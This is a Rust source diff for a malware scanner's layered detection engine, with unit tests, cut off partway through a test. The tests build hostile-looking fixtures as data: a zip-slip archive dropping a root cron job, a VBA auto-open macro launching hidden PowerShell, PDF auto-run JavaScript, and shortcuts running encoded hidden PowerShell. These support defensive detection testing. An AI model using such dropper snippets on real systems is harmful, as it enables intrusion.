+        } else if buffer.starts_with(b"\xD0\xCF\x11\xE0") {
+            if let Some(det) = detect_office_macro_threat(virtual_path, sha256_hex, entropy, buffer)
+            {
+                return Some(det);
+            }
+        }
+    }
+
+    // Windows Shell Link (.lnk) Dropper Inspection
+    if let Some(det) = inspect_lnk_shortcut(virtual_path, buffer, sha256_hex, entropy) {
+        return Some(det);
+    }
+
+    let content_lossy = String::from_utf8_lossy(buffer);
+    let lower_lossy = content_lossy.to_lowercase();
+
+    // Script De-obfuscation: UTF-16LE wide script text + Base64 dropper layers.
+    if let Some(utf16_text) = extract_utf16le_ascii(buffer) {
+        if utf16_text.contains(&eicar_test_string()) {
+            return Some(detection(
+                virtual_path,
+                sha256_hex,
+                entropy,
+                "EICAR-Standard-AV-Test-Signature",
+                "Test.Signature",
+                "High",
+                "UTF-16LE De-obfuscation Engine",
+                "EICAR test signature revealed after UTF-16LE decoding.".to_string(),
+            ));
+        }
+        if let Some(det) =
+            scan_yara_rules(virtual_path, sha256_hex, entropy, &utf16_text, utf16_text.as_bytes())
+        {
+            return Some(det);
+        }
+    }
+
+    if depth < MAX_ARCHIVE_DEPTH
+        && !buffer.starts_with(b"PK\x03\x04")
+        && !buffer.starts_with(b"\x1f\x8b")
+        && !is_tar_buffer(buffer)
+    {
+        if let Some(det) = inspect_base64_layers(virtual_path, &content_lossy, depth) {
+            return Some(det);
+        }
+    }
+
+    // Binary IOCTL & UTF-8 byte sequence heuristics (CVE-2024-21338 & CVE-2024-43468)
+    let has_appid_ioctl = buffer.windows(4).any(|w| w == [0x18, 0xA0, 0x22, 0x00]);
+    if has_appid_ioctl && (lower_lossy.contains("appid") || lower_lossy.contains("smartscreen")) {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "CVE_2024_21338_AppId_Kernel_BYOVD_Abuse",
+            "Exploit.KernelBYOVD",
+            "Critical",
+            "Binary IOCTL Inspector (CVE-2024-21338)",
+            "CVE-2024-21338 Windows Kernel appid.sys raw IOCTL 0x22A018 memory write / FudModule rootkit payload.".to_string(),
+        ));
+    }
+    let has_rlo_bytes = buffer
+        .windows(3)
+        .any(|w| w == [0xE2, 0x80, 0xAE] || w == [0xE2, 0x80, 0xAD]);
+    let lower_name = file_name.to_ascii_lowercase();
+    if has_rlo_bytes
+        && (lower_name.ends_with(".hta")
+            || lower_name.ends_with(".lnk")
+            || lower_name.ends_with(".url"))
+    {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "CVE_2024_43468_MSHTML_Unicode_RLO_Spoof",
+            "Exploit.MSHTML",
+            "High",
+            "Binary Byte Inspector (CVE-2024-43468)",
+            "CVE-2024-43468 MSHTML platform RCE via embedded UTF-8 Right-to-Left Override bytes.".to_string(),
+        ));
+    }
+
+    // Compiled YARA-X / Pure-Rust YARA rules engine (`SCANNER_ENGINE`).
+    if let Some(det) = scan_yara_rules(virtual_path, sha256_hex, entropy, &content_lossy, buffer) {
+        return Some(det);
+    }
+
+    // Deep PE/ELF Binary Heuristics (Tampered UPX, High-Entropy UPX, PE Injection Triad, ELF Fileless/Ptrace).
+    let is_pe = buffer.starts_with(b"MZ");
+    let is_elf = buffer.starts_with(b"\x7fELF");
+    if (is_pe || is_elf)
+        && !content_lossy.contains("UPX!")
+        && buffer.windows(4).any(|w| w == b"UPX0" || w == b"UPX1")
+    {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.Packed.TamperedUPX",
+            "Trojan.Packer",
+            "High",
+            "Deep PE/ELF Packer Inspector",
+            "Executable contains UPX section markers (UPX0/UPX1) with stripped UPX! header signature (anti-unpacking tamper).".to_string(),
+        ));
+    }
+    if (is_pe || is_elf) && entropy > 6.55 && content_lossy.contains("UPX!") {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.Packed.SuspiciousBinary",
+            "Suspicious.Packer",
+            "Medium",
+            "Entropy & Packer Analyzer",
+            format!("UPX-packed executable binary with high Shannon entropy ({} bits/byte).", entropy),
+        ));
+    }
+    if is_pe
+        && lower_lossy.contains("virtualallocex")
+        && lower_lossy.contains("writeprocessmemory")
+        && (lower_lossy.contains("createremotethread")
+            || lower_lossy.contains("queueuserapc")
+            || lower_lossy.contains("ntcreatethreadex"))
+    {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.PE.ProcessInjectionTriad",
+            "Trojan.Injector",
+            "High",
+            "Deep PE Import Heuristic",
+            "PE binary imports remote process memory allocation, write, and execution triad (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread/APC).".to_string(),
+        ));
+    }
+    if is_elf
+        && ((lower_lossy.contains("memfd_create")
+            && (lower_lossy.contains("/proc/self/fd/") || lower_lossy.contains("execveat")))
+            || (lower_lossy.contains("ptrace") && lower_lossy.contains("ptrace_poketext")))
+    {
+        return Some(detection(
+            virtual_path,
+            sha256_hex,
+            entropy,
+            "Heur.ELF.FilelessMemfdOrPtrace",
+            "Rootkit.Linux",
+            "High",
+            "Deep ELF Behavioral Heuristic",
+            "ELF binary references fileless memory execution (memfd_create + execveat/self-fd) or ptrace code injection.".to_string(),
+        ));
+    }
+
+    // Optional local ClamAV `clamd` socket hook (zero network, delegates to Talos DB when installed).
+    if depth == 0 {
+        if let Some(clam_sig) = query_clamd_instream(buffer) {
+            return Some(detection(
+                virtual_path,
+                sha256_hex,
+                entropy,
+                &format!("ClamAV.{}", clam_sig),
+                "ClamAV.Signature",
+                "Critical",
+                "ClamAV clamd Socket Bridge",
+                format!("Matched Cisco Talos signature '{}' via local clamd socket.", clam_sig),
+            ));
+        }
+    }
+
+    // Optional VirusTotal v3 SHA-256 cloud verification for high-entropy binaries.
+    if allow_cloud
+        && depth == 0
+        && (is_pe || is_elf)
+        && entropy > 7.15
+        && threat_intel_and_net::should_auto_check_vt()
+    {
+        if let Ok(vt) = threat_intel_and_net::vt_check_target(sha256_hex) {
+            if vt.verdict == "Malicious" || vt.verdict == "Suspicious" {
+                let sev = if vt.verdict == "Malicious" { "Critical" } else { "High" };
+                return Some(detection(
+                    virtual_path,
+                    sha256_hex,
+                    entropy,
+                    &format!("VirusTotal.{}", vt.threat_label.replace(' ', ".")),
+                    "Cloud.MultiEngine",
+                    sev,
+                    &format!("VirusTotal v3 ({}/{} engines)", vt.malicious + vt.suspicious, vt.total_engines),
+                    format!(
+                        "Flagged by {}/{} antivirus engines on VirusTotal ({}).",
+                        vt.malicious + vt.suspicious,
+                        vt.total_engines,
+                        vt.flagged_engines.into_iter().take(4).collect::<Vec<_>>().join(", ")
+                    ),
+                ));
+            }
+        }
+    }
+
+    None
+}
+
+fn scan_single_file_internal(path: &Path, allow_cloud: bool) -> Option<ThreatDetection> {
     if is_excluded_path(path) {
         return None;
     }
@@ -664,41 +2518,8 @@ pub fn scan_single_file(path: &Path) -> Option<ThreatDetection> {
     };
 
     // Layer 1: Fast SHA-256 lookup (built-in map + indexed SQLite `threat_hashes.db` + MalwareBazaar feed).
-    if let Some(&(name, category, severity)) = KNOWN_HASHES.get(sha256_hex.as_str()) {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            name,
-            category,
-            severity,
-            "Signature Engine (SHA-256)",
-            "Exact cryptographic hash match against core threat database.".to_string(),
-        )));
-    }
-    if let Some((name, category, severity)) = lookup_sqlite_hash(&sha256_hex) {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            &name,
-            &category,
-            &severity,
-            "SQLite Threat DB (O(1) SHA-256)",
-            "SHA-256 matched indexed local threat_hashes.db signature.".to_string(),
-        )));
-    }
-    if threat_intel_and_net::is_known_malware_hash(&sha256_hex) {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            "ThreatFeed.MalwareBazaar.Sample",
-            "Malware",
-            "Critical",
-            "Signature Engine (MalwareBazaar feed)",
-            "SHA-256 matches a recent malware sample published by abuse.ch MalwareBazaar.".to_string(),
-        )));
+    if let Some(det) = check_hash_layers(&full_path, &sha256_hex, entropy) {
+        return store_and_return(Some(det));
     }
 
     // Layer 2: EICAR test file.
@@ -766,96 +2587,22 @@ pub fn scan_single_file(path: &Path) -> Option<ThreatDetection> {
         return store_and_return(None);
     }
 
-    // Layer 4: Compiled YARA-X / Pure-Rust YARA rules engine (`SCANNER_ENGINE`).
-    let content_lossy = String::from_utf8_lossy(&buffer);
-    let lower_lossy = content_lossy.to_lowercase();
-
-    // Layer 4a: Binary IOCTL & UTF-8 byte sequence heuristics (CVE-2024-21338 & CVE-2024-43468)
-    let has_appid_ioctl = buffer.windows(4).any(|w| w == [0x18, 0xA0, 0x22, 0x00]);
-    if has_appid_ioctl && (lower_lossy.contains("appid") || lower_lossy.contains("smartscreen")) {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            "CVE_2024_21338_AppId_Kernel_BYOVD_Abuse",
-            "Exploit.KernelBYOVD",
-            "Critical",
-            "Binary IOCTL Inspector (CVE-2024-21338)",
-            "CVE-2024-21338 Windows Kernel appid.sys raw IOCTL 0x22A018 memory write / FudModule rootkit payload.".to_string(),
-        )));
+    let mut result = scan_buffer_layers(&full_path, &file_name, &buffer, &sha256_hex, 0, allow_cloud);
+    if result.is_none() && has_internet_motw(path) {
+        result = evaluate_motw_payload_risk(&full_path, &file_name, &buffer, &sha256_hex, entropy);
     }
-    let has_rlo_bytes = buffer.windows(3).any(|w| w == [0xE2, 0x80, 0xAE] || w == [0xE2, 0x80, 0xAD]);
-    if has_rlo_bytes && (file_name.ends_with(".hta") || file_name.ends_with(".lnk") || file_name.ends_with(".url")) {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            "CVE_2024_43468_MSHTML_Unicode_RLO_Spoof",
-            "Exploit.MSHTML",
-            "High",
-            "Binary Byte Inspector (CVE-2024-43468)",
-            "CVE-2024-43468 MSHTML platform RCE via embedded UTF-8 Right-to-Left Override bytes.".to_string(),
-        )));
-    }
+    store_and_return(result)
+}
 
-    if let Ok(engine) = SCANNER_ENGINE.read() {
-        for rule in &engine.yara_rules {
-            if rule.pattern.is_match(&content_lossy) {
-                return store_and_return(Some(detection(
-                    &full_path,
-                    &sha256_hex,
-                    entropy,
-                    &rule.name,
-                    &rule.category,
-                    &rule.severity,
-                    "YARA-X Behavioral Engine",
-                    rule.description.clone(),
-                )));
-            }
-        }
-    }
+/// Inspect a single file using the LRU Verdict Cache, SQLite SHA-256 DB, deep unpackers, YARA, clamd, and optional VirusTotal.
+pub fn scan_single_file(path: &Path) -> Option<ThreatDetection> {
+    scan_single_file_internal(path, true)
+}
 
-    // Layer 5: UPX-packed, high-entropy PE/ELF binaries.
-    let is_pe = buffer.starts_with(b"MZ");
-    let is_elf = buffer.starts_with(b"\x7fELF");
-    if (is_pe || is_elf) && entropy > 7.45 && content_lossy.contains("UPX!") {
-        return store_and_return(Some(detection(
-            &full_path,
-            &sha256_hex,
-            entropy,
-            "Heur.Packed.SuspiciousBinary",
-            "Suspicious.Packer",
-            "Medium",
-            "Entropy & Packer Analyzer",
-            format!("Packed executable binary with abnormally high Shannon entropy ({} bits/byte).", entropy),
-        )));
-    }
-
-    // Layer 6: Optional VirusTotal v3 SHA-256 cloud verification for high-entropy binaries.
-    if (is_pe || is_elf) && entropy > 7.15 && threat_intel_and_net::should_auto_check_vt() {
-        if let Ok(vt) = threat_intel_and_net::vt_check_target(&sha256_hex) {
-            if vt.verdict == "Malicious" || vt.verdict == "Suspicious" {
-                let sev = if vt.verdict == "Malicious" { "Critical" } else { "High" };
-                return store_and_return(Some(detection(
-                    &full_path,
-                    &sha256_hex,
-                    entropy,
-                    &format!("VirusTotal.{}", vt.threat_label.replace(' ', ".")),
-                    "Cloud.MultiEngine",
-                    sev,
-                    &format!("VirusTotal v3 ({}/{} engines)", vt.malicious + vt.suspicious, vt.total_engines),
-                    format!(
-                        "Flagged by {}/{} antivirus engines on VirusTotal ({}).",
-                        vt.malicious + vt.suspicious,
-                        vt.total_engines,
-                        vt.flagged_engines.into_iter().take(4).collect::<Vec<_>>().join(", ")
-                    ),
-                )));
-            }
-        }
-    }
-
-    store_and_return(None)
+/// Latency-bounded local inspection for kernel/realtime hooks (`allow_cloud = false`).
+#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
+pub fn scan_single_file_fast(path: &Path) -> Option<ThreatDetection> {
+    scan_single_file_internal(path, false)
 }
 
 /// Paths the scanner must never inspect (our own vault, canary decoys, SQLite DB, and Genesis-Seek binaries).
@@ -1003,4 +2750,486 @@ pub fn execute_scan(
         detections,
         completed_at: Utc::now(),
     })
+}
+
+#[cfg(test)]
+mod scanner_tests {
+    use super::*;
+    use flate2::write::GzEncoder;
+    use flate2::Compression;
+    use std::io::Write;
+
+    fn build_minimal_zip(entries: &[(&str, &[u8], bool)]) -> Vec<u8> {
+        let mut out = Vec::new();
+        let mut cd = Vec::new();
+        for (name, data, encrypted) in entries {
+            let local_off = out.len() as u32;
+            let flags: u16 = if *encrypted { 0x0001 } else { 0x0000 };
+            let name_bytes = name.as_bytes();
+            let size = data.len() as u32;
+
+            // Local file header (30 bytes)
+            out.extend_from_slice(b"PK\x03\x04");
+            out.extend_from_slice(&20u16.to_le_bytes()); // version needed
+            out.extend_from_slice(&flags.to_le_bytes());
+            out.extend_from_slice(&0u16.to_le_bytes()); // method 0 (stored)
+            out.extend_from_slice(&0u16.to_le_bytes()); // mod time
+            out.extend_from_slice(&0u16.to_le_bytes()); // mod date
+            out.extend_from_slice(&0u32.to_le_bytes()); // crc32
+            out.extend_from_slice(&size.to_le_bytes()); // compressed size
+            out.extend_from_slice(&size.to_le_bytes()); // uncompressed size
+            out.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
+            out.extend_from_slice(&0u16.to_le_bytes()); // extra len
+            out.extend_from_slice(name_bytes);
+            out.extend_from_slice(data);
+
+            // Central directory header (46 bytes)
+            cd.extend_from_slice(b"PK\x01\x02");
+            cd.extend_from_slice(&20u16.to_le_bytes());
+            cd.extend_from_slice(&20u16.to_le_bytes());
+            cd.extend_from_slice(&flags.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u32.to_le_bytes());
+            cd.extend_from_slice(&size.to_le_bytes());
+            cd.extend_from_slice(&size.to_le_bytes());
+            cd.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u16.to_le_bytes());
+            cd.extend_from_slice(&0u32.to_le_bytes());
+            cd.extend_from_slice(&local_off.to_le_bytes());
+            cd.extend_from_slice(name_bytes);
+        }
+        let cd_off = out.len() as u32;
+        let cd_size = cd.len() as u32;
+        out.extend_from_slice(&cd);
+        // End of Central Directory (22 bytes)
+        let count = entries.len() as u16;
+        out.extend_from_slice(b"PK\x05\x06");
+        out.extend_from_slice(&0u16.to_le_bytes());
+        out.extend_from_slice(&0u16.to_le_bytes());
+        out.extend_from_slice(&count.to_le_bytes());
+        out.extend_from_slice(&count.to_le_bytes());
+        out.extend_from_slice(&cd_size.to_le_bytes());
+        out.extend_from_slice(&cd_off.to_le_bytes());
+        out.extend_from_slice(&0u16.to_le_bytes());
+        out
+    }
+
+    fn build_minimal_tar_gz(member_name: &str, payload: &[u8]) -> Vec<u8> {
+        let mut tar = vec![0u8; 512];
+        let nb = member_name.as_bytes();
+        tar[..nb.len().min(100)].copy_from_slice(&nb[..nb.len().min(100)]);
+        tar[100..108].copy_from_slice(b"0000755\0");
+        let size_oct = format!("{:011o}\0", payload.len());
+        tar[124..136].copy_from_slice(size_oct.as_bytes());
+        tar[156] = b'0';
+        tar[257..263].copy_from_slice(b"ustar\0");
+        tar.extend_from_slice(payload);
+        let pad = (512 - (payload.len() % 512)) % 512;
+        tar.extend(std::iter::repeat(0u8).take(pad + 1024));
+
+        let mut enc = GzEncoder::new(Vec::new(), Compression::default());
+        enc.write_all(&tar).unwrap();
+        enc.finish().unwrap()
+    }
+
+    #[test]
+    fn yara_engine_supports_hex_and_threshold_conditions() {
+        let src = r#"
+rule Test_All_Hex_And_Regex {
+    meta:
+        category = "Exploit.Test"
+        severity = "Critical"
+        description = "Test rule"
+    strings:
+        $s1 = "appid" nocase
+        $h1 = { 18 a0 22 00 }
+    condition:
+        all of them
+}
+
+rule Test_Two_Of_Three {
+    meta:
+        category = "Trojan.Test"
+        severity = "High"
+        description = "Two of three rule"
+    strings:
+        $a = "alpha_ind"
+        $b = "beta_ind"
+        $c = "gamma_ind"
+    condition:
+        2 of them
+}
+"#;
+        let mut rules = Vec::new();
+        parse_yara_rules_from_source(src, &mut rules);
+        assert_eq!(rules.len(), 2);
+
+        let all_rule = &rules[0];
+        assert_eq!(all_rule.min_matches, 2);
+        assert!(!all_rule.matches("appid only", b"appid only"));
+        let mut raw = b"driver appid ".to_vec();
+        raw.extend_from_slice(&[0x18, 0xA0, 0x22, 0x00]);
+        assert!(all_rule.matches("driver appid ", &raw));
+
+        let two_rule = &rules[1];
+        assert_eq!(two_rule.min_matches, 2);
+        assert!(!two_rule.matches("alpha_ind alone", b"alpha_ind alone"));
+        assert!(two_rule.matches("alpha_ind and gamma_ind", b"alpha_ind and gamma_ind"));
+    }
+
+    #[test]
+    fn deep_unpacker_catches_zip_targz_zipslip_and_encrypted_droppers() {
+        let eicar = eicar_test_string();
+        let zip_eicar = build_minimal_zip(&[("docs/readme.txt", eicar.as_bytes(), false)]);
+        let det = scan_buffer_layers("test.zip", "test.zip", &zip_eicar, "11", 0, false);
+        assert!(det.is_some());
+        assert_eq!(det.unwrap().threat_name, "EICAR-Standard-AV-Test-Signature");
+
+        let zip_enc = build_minimal_zip(&[("invoice_payload.exe", b"MZdummyencrypted", true)]);
+        let det_enc = scan_buffer_layers("enc.zip", "enc.zip", &zip_enc, "22", 0, false);
+        assert_eq!(
+            det_enc.map(|d| d.threat_name).as_deref(),
+            Some("Heur.Archive.EncryptedExecutableDropper")
+        );
+
+        let zip_slip = build_minimal_zip(&[("../../etc/cron.d/pwn", b"* * * * * root id", false)]);
+        let det_slip = scan_buffer_layers("slip.zip", "slip.zip", &zip_slip, "33", 0, false);
+        assert_eq!(
+            det_slip.map(|d| d.threat_name).as_deref(),
+            Some("Heur.Archive.ZipSlipTraversal")
+        );
+
+        let tar_gz = build_minimal_tar_gz("drop/install.sh", eicar.as_bytes());
+        let det_tgz = scan_buffer_layers("bundle.tar.gz", "bundle.tar.gz", &tar_gz, "44", 0, false);
+        assert!(det_tgz.is_some());
+        assert_eq!(det_tgz.unwrap().threat_name, "EICAR-Standard-AV-Test-Signature");
+
+        let tmp_zip = std::env::temp_dir().join(format!("gs_unit_drop_{}.zip", Uuid::new_v4()));
+        fs::write(&tmp_zip, &zip_eicar).unwrap();
+        let disk_det = scan_single_file_fast(&tmp_zip);
+        let _ = fs::remove_file(&tmp_zip);
+        assert_eq!(
+            disk_det.map(|d| d.threat_name).as_deref(),
+            Some("EICAR-Standard-AV-Test-Signature")
+        );
+    }
+
+    #[test]
+    fn deep_unpacker_catches_pdf_flate_office_macro_and_base64_utf16le() {
+        use flate2::write::ZlibEncoder;
+        let mut z = ZlibEncoder::new(Vec::new(), Compression::default());
+        z.write_all(b"<< /S /JavaScript /JS (app.alert('pwn');) >>").unwrap();
+        let compressed_stream = z.finish().unwrap();
+
+        let mut pdf = b"%PDF-1.5\n1 0 obj << /OpenAction 2 0 R >> endobj\n2 0 obj << /Filter /FlateDecode >>\nstream\n".to_vec();
+        pdf.extend_from_slice(&compressed_stream);
+        pdf.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
+        let det_pdf = scan_buffer_layers("invoice.pdf", "invoice.pdf", &pdf, "55", 0, false);
+        assert_eq!(
+            det_pdf.map(|d| d.threat_name).as_deref(),
+            Some("Exploit.PDF.ActiveScriptOrLaunch")
+        );
+
+        let docm = build_minimal_zip(&[(
+            "word/vbaProject.bin",
+            b"Sub AutoOpen()\r\nCreateObject(\"WScript.Shell\").Run \"powershell -w hidden\"\r\nEnd Sub",
+            false,
+        )]);
+        let det_docm = scan_buffer_layers("report.docm", "report.docm", &docm, "66", 0, false);
+        assert_eq!(
+            det_docm.map(|d| d.threat_name).as_deref(),
+            Some("Heur.Office.MaliciousVBAMacro")
+        );
+
+        let eicar_utf16: Vec<u8> = eicar_test_string()
+            .as_bytes()
+            .iter()
+            .flat_map(|&b| [b, 0u8])
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&eicar_utf16);
+        let script = format!("powershell -EncodedCommand {}\n", b64);
+        let det_b64 = scan_buffer_layers("run.ps1", "run.ps1", script.as_bytes(), "77", 0, false);
+        assert!(det_b64.is_some());
+    }
+
+    #[test]
+    fn deep_pe_elf_heuristics_detect_packers_and_injection() {
+        let pe_upx = b"MZ\x90\x00\x03\x00UPX0\x00\x00UPX1\x00\x00dummy";
+        let det_upx = scan_buffer_layers("packed.exe", "packed.exe", pe_upx, "88", 0, false);
+        assert_eq!(
+            det_upx.map(|d| d.threat_name).as_deref(),
+            Some("Heur.Packed.TamperedUPX")
+        );
+
+        let pe_inj = b"MZ\x90\x00VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00";
+        let det_inj = scan_buffer_layers("inject.exe", "inject.exe", pe_inj, "99", 0, false);
+        assert_eq!(
+            det_inj.map(|d| d.threat_name).as_deref(),
+            Some("Heur.PE.ProcessInjectionTriad")
+        );
+
+        let elf_memfd = b"\x7fELF\x02\x01\x01memfd_create\x00/proc/self/fd/0\x00";
+        let det_elf = scan_buffer_layers("loader.elf", "loader.elf", elf_memfd, "aa", 0, false);
+        assert_eq!(
+            det_elf.map(|d| d.threat_name).as_deref(),
+            Some("Heur.ELF.FilelessMemfdOrPtrace")
+        );
+    }
+
+    #[test]
+    fn sqlite_filters_empty_invalid_hashes_and_recovers_corruption() {
+        let tmp_db = std::env::temp_dir().join(format!("gs_sqlite_test_{}.db", Uuid::new_v4()));
+        fs::write(&tmp_db, b"CORRUPTED_NON_SQLITE_GARBAGE_BYTES_0000").unwrap();
+
+        let valid_sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+        let entries = vec![
+            (EMPTY_FILE_SHA256.to_string(), "BadEmpty".into(), "Test".into(), "Low".into()),
+            ("not_a_valid_sha256".to_string(), "BadHex".into(), "Test".into(), "Low".into()),
+            (valid_sha.to_string(), "Test.Sample".into(), "Trojan".into(), "High".into()),
+        ];
+        let inserted = batch_insert_threat_hashes_at(&tmp_db, &entries);
+        assert_eq!(inserted, 1);
+
+        let conn = Connection::open(&tmp_db).unwrap();
+        let count: i64 = conn
+            .query_row(
+                "SELECT COUNT(*) FROM threat_hashes WHERE sha256 = ?1",
+                params![valid_sha],
+                |r| r.get(0),
+            )
+            .unwrap();
+        assert_eq!(count, 1);
+        drop(conn);
+        let _ = fs::remove_file(&tmp_db);
+    }
+
+    fn build_structured_lnk(rel_path: &str, args: &str, icon: &str) -> Vec<u8> {
+        let clsid: [u8; 16] = [
+            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+        ];
+        // HasRelativePath (0x08) | HasArguments (0x20) | HasIconLocation (0x40) | IsUnicode (0x80)
+        let flags: u32 = 0x0008 | 0x0020 | 0x0040 | 0x0080;
+        let mut out = Vec::new();
+        out.extend_from_slice(&0x0000_004Cu32.to_le_bytes());
+        out.extend_from_slice(&clsid);
+        out.extend_from_slice(&flags.to_le_bytes());
+        out.resize(76, 0);
+
+        let push_u16_str = |buf: &mut Vec<u8>, s: &str| {
+            let units: Vec<u16> = s.encode_utf16().collect();
+            buf.extend_from_slice(&(units.len() as u16).to_le_bytes());
+            for u in units {
+                buf.extend_from_slice(&u.to_le_bytes());
+            }
+        };
+        push_u16_str(&mut out, rel_path);
+        push_u16_str(&mut out, args);
+        push_u16_str(&mut out, icon);
+        out
+    }
+
+    #[test]
+    fn detects_malicious_lnk_shortcut_dropper_without_benign_false_positives() {
+        let mal_lnk = build_structured_lnk(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-nop -w hidden -enc SQBFAFgA",
+            r"C:\Program Files\Adobe\Acrobat.exe",
+        );
+        let det = scan_buffer_layers("invoice.lnk", "invoice.lnk", &mal_lnk, "bb", 0, false);
+        assert_eq!(
+            det.map(|d| d.threat_name).as_deref(),
+            Some("Heur.LNK.MaliciousShortcutDropper")
+        );
+
+        let benign_cmd = build_structured_lnk(
+            r"C:\Windows\System32\cmd.exe",
+            "/k echo Build Dev Env",
+            r"C:\Windows\System32\cmd.exe",
+        );
+        assert!(scan_buffer_layers("devprompt.lnk", "devprompt.lnk", &benign_cmd, "cc", 0, false).is_none());
+
+        let benign_url_arg = build_structured_lnk(
+            r"C:\Program Files\App\app.exe",
+            "--docs https://example.com",
+            r"C:\Program Files\App\app.exe",
+        );
+        assert!(scan_buffer_layers("app.lnk", "app.lnk", &benign_url_arg, "dd", 0, false).is_none());
+
+        // Benign PowerShell -Encoding utf8 and cmd.exe /c start https://... must NOT false-positive
+        let benign_ps_encoding = build_structured_lnk(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-File build.ps1 -Encoding utf8",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        );
+        assert!(
+            scan_buffer_layers("build.lnk", "build.lnk", &benign_ps_encoding, "d1", 0, false)
+                .is_none()
+        );
+
+        // Prefix-shortened PowerShell -e and -enco flags MUST be caught
+        let short_ps_e = build_structured_lnk(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-NoP -e SQBFAFgA",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        );
+        assert_eq!(
+            scan_buffer_layers("short_e.lnk", "short_e.lnk", &short_ps_e, "d1b", 0, false)
+                .map(|d| d.threat_name)
+                .as_deref(),
+            Some("Heur.LNK.MaliciousShortcutDropper")
+        );
+
+        let short_ps_enco = build_structured_lnk(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "-NoP -enco:SQBFAFgA",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        );
+        assert_eq!(
+            scan_buffer_layers("short_enco.lnk", "short_enco.lnk", &short_ps_enco, "d1c", 0, false)
+                .map(|d| d.threat_name)
+                .as_deref(),
+            Some("Heur.LNK.MaliciousShortcutDropper")
+        );
+
+        let benign_cmd_start_url = build_structured_lnk(
+            r"C:\Windows\System32\cmd.exe",
+            "/c start https://example.com/docs",
+            r"C:\Windows\System32\cmd.exe",
+        );
+        assert!(
+            scan_buffer_layers("docs.lnk", "docs.lnk", &benign_cmd_start_url, "d2", 0, false)
+                .is_none()
+        );
+
+        // Benign non-PowerShell /E or -e flags (cmd /E:ON, xcopy /E) must NOT false-positive
+        let benign_cmd_eon = build_structured_lnk(
+            r"C:\Windows\System32\cmd.exe",
+            "/E:ON /V:ON /c echo Ready",
+            r"C:\Windows\System32\cmd.exe",
+        );
+        assert!(
+            scan_buffer_layers("cmd_eon.lnk", "cmd_eon.lnk", &benign_cmd_eon, "d2b", 0, false)
+                .is_none()
+        );
+
+        let benign_xcopy_e = build_structured_lnk(
+            r"C:\Windows\System32\xcopy.exe",
+            r"C:\src C:\dst /E /I /Y",
+            r"C:\Windows\System32\xcopy.exe",
+        );
+        assert!(
+            scan_buffer_layers("xcopy.lnk", "xcopy.lnk", &benign_xcopy_e, "d2c", 0, false)
+                .is_none()
+        );
+
+        // Structured MS-SHLLINK with HasLinkTargetIDList (0x01) + HasLinkInfo (0x02) network UNC share + CommonPathSuffix
+        let mut unc_lnk = Vec::new();
+        let clsid: [u8; 16] = [
+            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+        ];
+        let unc_flags: u32 = 0x0001 | 0x0002; // HasLinkTargetIDList | HasLinkInfo
+        unc_lnk.extend_from_slice(&0x0000_004Cu32.to_le_bytes());
+        unc_lnk.extend_from_slice(&clsid);
+        unc_lnk.extend_from_slice(&unc_flags.to_le_bytes());
+        unc_lnk.resize(76, 0);
+        // LinkTargetIDList: 4-byte dummy IDList
+        unc_lnk.extend_from_slice(&4u16.to_le_bytes());
+        unc_lnk.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
+        // LinkInfo with CommonNetworkRelativeLinkAndPathSuffix (flag 0x02)
+        let mut link_info = vec![0u8; 28];
+        link_info[4..8].copy_from_slice(&28u32.to_le_bytes()); // LinkInfoHeaderSize
+        link_info[8..12].copy_from_slice(&0x02u32.to_le_bytes()); // LinkInfoFlags = CommonNetworkRelativeLinkAndPathSuffix
+        let net_struct_off = link_info.len() as u32;
+        link_info[20..24].copy_from_slice(&net_struct_off.to_le_bytes());
+        // CommonNetworkRelativeLink: 20-byte header + "\\192.168.1.50\pub\0"
+        let share = b"\\\\192.168.1.50\\pub\0";
+        let net_struct_size = (20 + share.len()) as u32;
+        link_info.extend_from_slice(&net_struct_size.to_le_bytes());
+        link_info.extend_from_slice(&0u32.to_le_bytes()); // flags
+        link_info.extend_from_slice(&20u32.to_le_bytes()); // NetNameOffset = 20
